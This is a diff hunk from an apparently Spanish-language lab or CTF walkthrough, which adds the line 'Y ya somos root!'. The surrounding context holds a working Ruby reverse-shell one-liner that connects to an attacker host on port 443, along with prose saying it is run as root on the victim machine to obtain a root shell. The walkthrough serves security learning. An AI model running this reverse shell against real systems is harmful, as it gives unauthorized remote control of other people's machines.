@@ -115,6 +115,7 @@ export RPORT=443
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
+Y ya somos root!
 Una vez creado lo compartimos a la máquina víctima y le damos permiso de ejecución, lo ejecutamos con el usuario root mientras estamos en escucha desde nuestra máquina atacante y bingo, somos root.
 
 ![ROOT](https://github.com/Isma-yo/photos/blob/main/MyBB/foto14.png)
